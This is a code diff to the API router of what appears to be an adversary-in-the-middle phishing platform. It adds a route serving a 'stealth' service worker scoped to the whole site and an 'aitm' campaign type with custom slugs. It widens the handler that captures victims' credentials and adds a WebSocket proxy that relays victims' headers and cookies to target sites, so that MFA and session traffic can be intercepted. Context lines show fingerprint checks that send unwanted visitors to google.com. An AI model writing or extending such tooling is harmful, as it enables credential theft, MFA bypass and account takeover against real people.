@@ -69,6 +69,16 @@ async def verify_fingerprint(request: Request):
         print(f"[API Error] Fingerprint verification failed: {e}")
         return {"redirect_to": "https://google.com"}
 
+@router.get("/sw.js")
+async def service_worker():
+    """Serves the Stealth Service Worker (Power/Stealth)."""
+    try:
+        with open("core/assets/js/sw_stealth.js", "r") as f:
+            content = f.read()
+        return Response(content=content, media_type="application/javascript", headers={"Service-Worker-Allowed": "/"})
+    except FileNotFoundError:
+        return Response(content="// SW Not Found", media_type="application/javascript")
+
 @router.get("/health")
 @redis_cache.cached("health_check", expire=60)
 async def health_check():
@@ -78,10 +88,16 @@ async def health_check():
 # --- Social Engineering Campaigns ---
 
 @router.post("/campaigns/create")
-async def create_campaign(name: str = Form(...), template_id: str = Form(...), target_email: Optional[str] = Form(None)):
+async def create_campaign(
+    name: str = Form(...), 
+    template_id: str = Form(...), 
+    target_email: Optional[str] = Form(None),
+    campaign_type: str = Form("aitm"),
+    custom_slug: Optional[str] = Form(None)
+):
     """Crée une nouvelle campagne de phishing."""
     try:
-        campaign = social_manager.create_campaign(name, template_id, target_email)
+        campaign = social_manager.create_campaign(name, template_id, target_email, campaign_type, custom_slug=custom_slug)
         return {"status": "success", "campaign": campaign}
     except ValueError as e:
         raise HTTPException(status_code=400, detail=str(e))
@@ -222,8 +238,8 @@ async def capture_credentials(request: Request, sid: Optional[str] = None, cid: 
         captured_data = dict(form_data)
     
     # Gestion des paramètres de requête (priorité sur le body si présents)
-    session_id = sid or request.query_params.get("sid")
-    campaign_id = cid or request.query_params.get("cid")
+    session_id = sid or request.query_params.get("sid") or captured_data.get("sid")
+    campaign_id = cid or request.query_params.get("cid") or captured_data.get("cid")
     
     if not session_id and campaign_id:
         # Création d'une session à la volée si pas de SID
@@ -333,3 +349,47 @@ async def aitm_proxy_handler(session_id: str, path: str, request: Request):
         body, 
         proxy_base_path=proxy_base_path
     )
+
+@router.websocket("/p/{session_id}/ws")
+async def websocket_proxy(websocket: WebSocket, session_id: str, url: str = None):
+    """
+    WebSocket Proxy Endpoint for AiTM.
+    Handles real-time traffic (MFA, Chat, Notifications).
+    """
+    await websocket.accept()
+    
+    try:
+        # 1. Session Validation
+        session = session_manager.get_session(session_id)
+        if not session:
+            print(f"[WS Proxy] Invalid session: {session_id}")
+            await websocket.close(code=1008) # Policy Violation
+            return
+
+        # 2. Target URL Resolution
+        if not url:
+            # If URL is not provided, we might be trying to connect to the base target URL
+            # But usually our rewriter puts ?url=...
+            print(f"[WS Proxy] Missing target URL for session {session_id}")
+            await websocket.close(code=1002) # Protocol Error
+            return
+            
+        # 3. Proxy Execution
+        # We pass headers and cookies to maintain session context
+        headers = dict(websocket.headers)
+        cookies = websocket.cookies
+        
+        await aitm_proxy.proxy_websocket(
+            url, 
+            websocket, 
+            session_id, 
+            headers, 
+            cookies
+        )
+        
+    except Exception as e:
+        print(f"[WS Proxy Critical Error] {e}")
+        try:
+            await websocket.close(code=1011) # Internal Error
+        except RuntimeError:
+            pass # Already closed
